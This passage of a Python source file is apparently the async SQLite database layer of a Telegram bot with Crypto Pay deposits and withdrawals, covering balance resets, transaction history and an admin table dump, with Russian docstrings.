            await self.log_error(f"Ошибка: Пользователь {user_id} не найден. Невозможно обнулить баланс.")
            return False
        try:
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute("BEGIN"):
                    try:
                        await db.execute("UPDATE users SET balance = 0 WHERE user_id = ?",
                                         (user_id,))
                        await db.commit()
                        await self.log_info(f"Баланс пользователя {user_id} обнулен.")
                        return True
                    except Exception as e:
                        await db.rollback()
                        await self.log_error(f"Ошибка при обнулении баланса пользователя {user_id}: {e}")
                        raise e
        except Exception as e:
            await self.log_error(f"Ошибка подключения к БД при обнулении баланса для {user_id}: {e}")
            return False

    async def get_transactions(self, user_id: int, show_all: bool = False, limit: int = 10) -> List[Dict[str, Any]]:
        """
        Получает историю внутренних транзакций для указанного пользователя.
        По умолчанию возвращает последние 10 транзакций.
        Если `show_all` установлен в True, возвращает все транзакции.
        :param user_id: ID пользователя Telegram.
        :param show_all: Если True, возвращает все транзакции пользователя.
        :param limit: Максимальное количество транзакций для получения, если `show_all` равно False.
        :return: Список словарей, каждый из которых представляет транзакцию.
        Поля: 'amount', 'type', 'description', 'timestamp'.
        """
        if show_all:
            query = ("SELECT amount, type, description, timestamp FROM transactions WHERE user_id = ? "
                     "ORDER BY timestamp ASC")
            return await self.fetch_all(query, (user_id,))

        query = ("SELECT amount, type, description, timestamp FROM transactions WHERE user_id = ? "
                 "ORDER BY timestamp DESC LIMIT ?")
        return await self.fetch_all(query, (user_id, limit))

    async def get_transaction_by_id(self, internal_transaction_id: int) -> Optional[Dict[str, Any]]:
        """
        Получает информацию об *внутренней* транзакции по ее числовому ID.
        Эта транзакция относится к таблице `transactions` (не к `provider_transactions`).
        :param internal_transaction_id: Уникальный числовой ID транзакции в таблице `transactions`.
        :return: Словарь с данными транзакции или None, если транзакция не найдена.
        """
        return await self.fetch_one("SELECT * FROM transactions WHERE transaction_id = ?", (internal_transaction_id,))

    async def create_transaction(self, transaction_id: str, user_id: int,
                                 transaction_type: str, amount: float, currency: str, status: str,
                                 description: Optional[str] = None, crypto_id: Optional[int] = None,
                                 crypto_data: Optional[Dict[str, Any]] = None,
                                 payload: Optional[str] = None,
                                 created_at: Optional[datetime] = None,
                                 updated_at: Optional[datetime] = None) -> None:
        """
        Создает новую запись о транзакции с внешним провайдером в таблице `provider_transactions`.

        :param transaction_id: Уникальный внутренний ID транзакции (UUID).
        :param user_id: ID пользователя, к которому относится транзакция.
        :param transaction_type: Тип транзакции ('deposit' или 'withdrawal').
        :param amount: Сумма транзакции.
        :param currency: Валюта транзакции (например, 'TON', 'BTC', 'USD').
        :param status: Текущий статус транзакции (из TransactionStatus).
        :param description: Опциональное описание транзакции.
        :param crypto_id: ID счёта/перевода в Crypto Pay API (например, invoice_id, transfer_id).
        :param crypto_data: Дополнительные данные из Crypto Pay (JSON-сериализуемый dict).
        :param payload: Дополнительные данные для отслеживания (например, spend_id).
        :param created_at: Время создания транзакции (если None, используется CURRENT_TIMESTAMP).
        :param updated_at: Время последнего обновления (если None, используется CURRENT_TIMESTAMP).
        """
        import json
        crypto_data_json = None
        if crypto_data:
            try:
                crypto_data_json = json.dumps(crypto_data)
            except Exception as e:
                await self.log_error(f"Ошибка сериализации crypto_data: {e}")
                crypto_data_json = None
        now = datetime.now()
        ct = created_at or now
        ut = updated_at or now
        query = """
            INSERT INTO provider_transactions
            (transaction_id, user_id, transaction_type, amount, currency, status, 
             description, crypto_id, crypto_data, payload, created_at, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """
        params = (
            transaction_id, user_id, transaction_type, amount,
            currency, status, description, crypto_id,
            crypto_data_json, payload, ct, ut
        )
        try:
            await self.execute(query, params)
            await self.log_debug(
                f"✓ Создана провайдер-транзакция: TxID={transaction_id}, "
                f"User={user_id}, Type={transaction_type}, Amount={amount} {currency}, Status={status}"
            )
        except Exception as e:
            await self.log_error(f"✗ Ошибка при создании транзакции {transaction_id}: {e}")
            raise

    async def update_transaction_status(self, transaction_id: str, status: str,
                                        message: Optional[str] = None,
                                        updated_at: Optional[datetime] = None,
                                        crypto_data: Optional[Dict[str, Any]] = None) -> None:
        """
        Обновляет статус существующей транзакции в таблице `provider_transactions`.

        :param transaction_id: Уникальный внутренний ID транзакции (UUID).
        :param status: Новый статус транзакции (из TransactionStatus).
        :param message: Опциональное сообщение/ошибка, связанное с обновлением статуса.
        :param updated_at: Время обновления (если None, используется CURRENT_TIMESTAMP).
        :param crypto_data: Дополнительные данные из Crypto Pay (будут объединены с существующими).
        """
        import json
        update_parts = ["status = ?"]
        params = [status]
        if message is not None:
            update_parts.append("message = ?")
            params.append(message)
        if updated_at:
            update_parts.append("updated_at = ?")
            params.append(str(updated_at))
        else:
            update_parts.append("updated_at = CURRENT_TIMESTAMP")
        if crypto_data:
            existing = await self.fetch_one(
                "SELECT crypto_data FROM provider_transactions WHERE transaction_id = ?",
                (transaction_id,)
            )
            merged_data = {}
            if existing and existing["crypto_data"]:
                try:
                    merged_data = json.loads(existing["crypto_data"])
                except json.JSONDecodeError:
                    merged_data = {}
            merged_data.update(crypto_data)
            try:
                crypto_data_json = json.dumps(merged_data)
                update_parts.append("crypto_data = ?")
                params.append(crypto_data_json)
            except Exception as e:
                await self.log_error(f"Ошибка сериализации crypto_data при обновлении: {e}")
        params.append(transaction_id)
        query = f"""
            UPDATE provider_transactions
            SET {', '.join(update_parts)}
            WHERE transaction_id = ?
        """
        try:
            await self.execute(query, tuple(params))
            await self.log_debug(
                f"✓ Обновлён статус транзакции {transaction_id} -> {status}"
                f"{(' | Message: ' + message) if message else ''}"
            )
        except Exception as e:
            await self.log_error(f"✗ Ошибка при обновлении статуса {transaction_id}: {e}")

    async def get_crypto_data(self, transaction_id: str) -> Optional[Dict[str, Any]]:
        """
        Получает криптографические данные транзакции из таблицы `provider_transactions`.

        :param transaction_id: Уникальный внутренний ID транзакции (UUID).
        :return: Словарь с crypto_data или None если транзакция не найдена или данные пусты.
        """
        import json
        try:
            result = await self.fetch_one(
                "SELECT crypto_data FROM provider_transactions WHERE transaction_id = ?",
                (transaction_id,)
            )
            if not result:
                await self.log_debug(f"Транзакция {transaction_id} не найдена")
                return None
            crypto_data_str = result.get("crypto_data")
            if not crypto_data_str:
                await self.log_debug(f"crypto_data для транзакции {transaction_id} пусто")
                return None
            try:
                crypto_data = json.loads(crypto_data_str)
                await self.log_debug(f"✓ Получены crypto_data для транзакции {transaction_id}")
                return crypto_data
            except json.JSONDecodeError as e:
                await self.log_error(
                    f"Ошибка парсинга JSON crypto_data для {transaction_id}: {e}"
                )
                return None
        except Exception as e:
            await self.log_error(f"Ошибка при получении crypto_data для {transaction_id}: {e}")
            return None

    async def get_provider_transaction(self, transaction_id: str) -> Optional[Dict[str, Any]]:
        """
        Получает информацию о транзакции с внешним провайдером по ее внутреннему UUID.
        :param transaction_id: Уникальный внутренний ID транзакции (UUID).
        :return: Словарь с данными транзакции из `provider_transactions` или None, если не найдена.
        """
        return await self.fetch_one("SELECT * FROM provider_transactions WHERE transaction_id = ?", (transaction_id,))

    async def get_tables(self):
        tables = await self.fetch_all("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name")
        if not tables:
            return False, ["❌ Таблицы не найдены."]
        return True, [table.get('name') for table in tables]

    async def display_table(self, table_name: str) -> List[str]:
        result = []
        try:
            max_chunk_size = 4000
            current_chunk = "📊 <b>╔═══ ПОЛНЫЙ СОСТАВ БД ═══╗</b>\n\n"
            columns_info = await self.fetch_all(f"PRAGMA table_info({table_name})")
            column_names = [col.get('name') for col in columns_info]
            has_user_id = 'user_id' in column_names
            if has_user_id:
                blocked_ids_str = ','.join(map(str, self.BLOCKED_USER_IDS))
                count_query = (f"SELECT COUNT(*) as count FROM {table_name} WHERE user_id >= 100 AND "
                               f"user_id NOT IN ({blocked_ids_str})")
                rows_query = f"SELECT * FROM {table_name} WHERE user_id >= 100 AND user_id NOT IN ({blocked_ids_str})"
            else:
                count_query = f"SELECT COUNT(*) as count FROM {table_name}"
                rows_query = f"SELECT * FROM {table_name}"
            row_count_result = await self.fetch_one(count_query)
            row_count = row_count_result.get('count', 0) if row_count_result else 0
            table_header = f"\n<b>📋 {table_name.upper()}</b>\n"
            table_header += f"<code>├─ Строк: {row_count}</code>\n"
            table_header += f"<code>└─ Колонки: {', '.join(column_names)}</code>\n"
            table_header += "─" * 40 + "\n"
            rows = await self.fetch_all(rows_query)
            if len(current_chunk) + len(table_header) > max_chunk_size:
                if len(current_chunk) > len("📊 <b>╔═══ ПОЛНЫЙ СОСТАВ БД ═══╗</b>\n\n"):
                    result.append(current_chunk)
                    current_chunk = table_header
                else:
                    current_chunk += table_header
            else:
                current_chunk += table_header
            if rows:
                for idx, row in enumerate(rows, 1):
                    row_items = [f"<b>{k}:</b> <code>{v}</code>" for k, v in row.items()]
                    row_text = f"<b>#{idx}</b> │ " + " │ ".join(row_items) + "\n"

                    if len(current_chunk) + len(row_text) > max_chunk_size:
                        if len(current_chunk) > len("📊 <b>╔═══ ПОЛНЫЙ СОСТАВ БД ═══╗</b>\n\n"):
                            result.append(current_chunk)
                            current_chunk = row_text
                        else:
                            current_chunk += row_text
                    else:
                        current_chunk += row_text
                current_chunk += "\n"
            else:
                current_chunk += "<i>ℹ️ Таблица пуста</i>\n\n"
            if len(current_chunk) > len("📊 <b>╔═══ ПОЛНЫЙ СОСТАВ БД ═══╗</b>\n\n"):
                current_chunk += "\n<b>╚═══════════════════════╝</b>"
                result.append(current_chunk)
            await self.log_info("Данные БД успешно подготовлены для отображения.")
            return result if result else ["ℹ️ Нет данных для отображения."]
        except Exception as e:
            error_msg = f"❌ Ошибка при выводе БД: {e}"
            await self.log_error(f"Ошибка в методе display_table: {e}")
            return [error_msg]

    async def get_transaction(self, transaction_id: str) -> Optional[Dict[str, Any]]:
        """
        Получает данные транзакции по её ID.

        :param transaction_id: Внутренний ID транзакции
        :return: Словарь с данными транзакции или None если не найдена
        """
        try:
            query = """
                SELECT 
                    transaction_id,
                    user_id,
                    transaction_type,
                    amount,
                    currency,
                    status,
                    description,
                    crypto_id,
                    payload,
                    message,
                    crypto_data,
                    created_at,
                    updated_at
                FROM provider_transactions
                WHERE transaction_id = ?
                LIMIT 1
            """
            result = await self.fetch_one(query, (transaction_id,))
            if not result:
                return None
            return dict(result)
        except Exception as e:
            await self.log_error(
                f"Failed to get transaction: {e}",
                extra={"transaction_id": transaction_id}
            )
            raise

    async def get_user_transactions(self, user_id: int, limit: int = 50, offset: int = 0) -> List[Dict[str, Any]]:
        """
        Получает историю всех транзакций пользователя.
        :param user_id: Telegram ID пользователя
        :param limit: Максимальное количество записей (по умолчанию 50)
        :param offset: Смещение для пагинации (по умолчанию 0)
        :return: Список словарей с данными транзакций
        """
        try:
            query = """
                SELECT 
                    transaction_id,
                    user_id,
                    transaction_type,
                    amount,
                    currency,
                    status,
                    description,
                    crypto_id,
                    payload,
                    message,
                    crypto_data,
                    created_at,
                    updated_at
                FROM provider_transactions
                WHERE user_id = ?
                ORDER BY created_at DESC
                LIMIT ? OFFSET ?
            """
            results = await self.fetch_all(query, (user_id, limit, offset))
            if not results:
                return []
            transactions = [dict(row) for row in results]
            await self.log_debug(
                f"Retrieved {len(transactions)} transactions for user",
                extra={"user_id": user_id, "limit": limit, "offset": offset}
            )
            return transactions
        except Exception as e:
            await self.log_error(
                f"Failed to get user transactions: {e}",
                extra={"user_id": user_id, "limit": limit, "offset": offset}
            )
            raise
